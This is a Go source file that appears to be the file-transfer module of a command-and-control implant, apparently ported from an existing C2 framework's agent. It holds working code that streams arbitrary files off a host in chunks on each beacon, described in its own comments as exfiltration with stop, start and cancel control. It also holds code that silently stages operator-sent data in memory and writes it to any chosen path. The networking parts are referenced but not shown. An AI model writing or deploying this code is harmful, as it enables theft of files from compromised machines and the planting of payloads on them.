package main

import (
	"crypto/rand"
	"encoding/binary"
	"io"
	"os"
	"path/filepath"
	"sync"
	"syscall"
)

type download struct {
	taskID uint32
	fileID uint32
	f      *os.File
	size   uint64
	index  uint64
	state  uint8
}

type downloader struct {
	mu    sync.Mutex
	items []*download
	chunk int
}

func newDownloader(chunk int) *downloader {
	if chunk <= 0 {
		chunk = 0x19000
	}
	return &downloader{chunk: chunk}
}

func randomID() uint32 {
	var b [4]byte
	if _, err := rand.Read(b[:]); err != nil {
		return uint32(os.Getpid())<<16 | 0x1234
	}
	return binary.LittleEndian.Uint32(b[:])
}

// start registers a new download and emits the DOWNLOAD_START record.
func (d *downloader) start(a *agent, taskID uint32, path string) error {
	f, err := os.Open(path)
	if err != nil {
		return err
	}
	st, err := f.Stat()
	if err != nil {
		_ = f.Close()
		return err
	}
	if st.IsDir() {
		_ = f.Close()
		return syscall.EISDIR
	}
	abs, err := filepath.Abs(path)
	if err != nil {
		abs = path
	}

	fileID := randomID()
	item := &download{
		taskID: taskID,
		fileID: fileID,
		f:      f,
		size:   uint64(st.Size()),
		state:  downloadStateRunning,
	}

	d.mu.Lock()
	d.items = append(d.items, item)
	d.mu.Unlock()

	a.reply(taskID, cmdDownload, func(w *writer) {
		w.u32(fileID)
		w.u8(downloadStart)
		w.u64(item.size)
		w.str(abs)
	})
	return nil
}

// setState applies exfil stop/start/cancel requests.
func (d *downloader) setState(a *agent, taskID, fileID uint32, state uint8) {
	d.mu.Lock()
	var found *download
	for _, it := range d.items {
		if it.fileID == fileID {
			found = it
			break
		}
	}
	if found != nil {
		found.state = state
		if state == downloadStateCanceled || state == downloadStateStopped {
			_ = found.f.Close()
		}
	}
	d.mu.Unlock()

	if found == nil {
		a.replyErrorCode(taskID, uint32(syscall.ENOENT))
		return
	}
	a.reply(taskID, cmdDownloadState, func(w *writer) {
		w.u32(fileID)
		w.u8(state)
	})
}

// pump streams one chunk per registered download per beacon, mirroring
// Downloader::ProcessDownloader.
func (d *downloader) pump(a *agent) {
	d.mu.Lock()
	defer d.mu.Unlock()

	for i := 0; i < len(d.items); {
		it := d.items[i]

		switch it.state {
		case downloadStateStopped:
			i++
			continue

		case downloadStateCanceled:
			_ = it.f.Close()
			d.items = append(d.items[:i], d.items[i+1:]...)
			continue

		case downloadStateFinished:
			_ = it.f.Close()
			d.items = append(d.items[:i], d.items[i+1:]...)
			continue
		}

		buf := make([]byte, d.chunk)
		n, err := it.f.Read(buf)
		if n > 0 {
			it.index += uint64(n)
			chunk := buf[:n]
			a.out.emit(func(w *writer) {
				w.u32(it.taskID)
				w.u32(cmdDownload)
				w.u32(it.fileID)
				w.u8(downloadContinue)
				w.bytes(chunk)
			})
			if it.index >= it.size {
				it.state = downloadStateFinished
			}
		}
		if err != nil && n == 0 {
			if err == io.EOF || it.index >= it.size {
				it.state = downloadStateFinished
			} else {
				it.state = downloadStateCanceled
				a.out.emit(func(w *writer) {
					w.u32(it.taskID)
					w.u32(cmdDownloadState)
					w.u32(it.fileID)
					w.u8(downloadStateCanceled)
				})
			}
		}

		if it.state == downloadStateFinished {
			a.out.emit(func(w *writer) {
				w.u32(it.taskID)
				w.u32(cmdDownload)
				w.u32(it.fileID)
				w.u8(downloadFinish)
			})
			_ = it.f.Close()
			d.items = append(d.items[:i], d.items[i+1:]...)
			continue
		}
		i++
	}
}

func (d *downloader) closeAll() {
	d.mu.Lock()
	defer d.mu.Unlock()
	for _, it := range d.items {
		_ = it.f.Close()
	}
	d.items = nil
}

// ---------------------------------------------------------------------------
// Upload (COMMAND_SAVEMEMORY staging + COMMAND_UPLOAD commit)
// ---------------------------------------------------------------------------

type uploadBuffer struct {
	total int
	buf   []byte
}

func (a *agent) cmdSaveMemory(r *reader) {
	memoryID := r.u32()
	totalSize := int(r.u32())
	data := r.bytes()
	_ = r.u32() // trailing task id: save-memory is silent

	a.uploadMu.Lock()
	u := a.uploads[memoryID]
	if u == nil {
		u = &uploadBuffer{}
		a.uploads[memoryID] = u
	}
	u.total = totalSize
	u.buf = append(u.buf, data...)
	a.uploadMu.Unlock()
}

func (a *agent) cmdUpload(r *reader) {
	memoryID := r.u32()
	path := r.str()
	taskID := r.u32()

	a.uploadMu.Lock()
	u := a.uploads[memoryID]
	delete(a.uploads, memoryID)
	a.uploadMu.Unlock()

	if u == nil || len(u.buf) != u.total {
		a.replyErrorCode(taskID, uint32(syscall.EINVAL))
		return
	}

	f, err := os.OpenFile(path, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
	if err != nil {
		a.replyErr(taskID, err)
		return
	}
	if _, err := f.Write(u.buf); err != nil {
		_ = f.Close()
		a.replyErr(taskID, err)
		return
	}
	if err := f.Close(); err != nil {
		a.replyErr(taskID, err)
		return
	}
	a.reply(taskID, cmdUpload, nil)
}
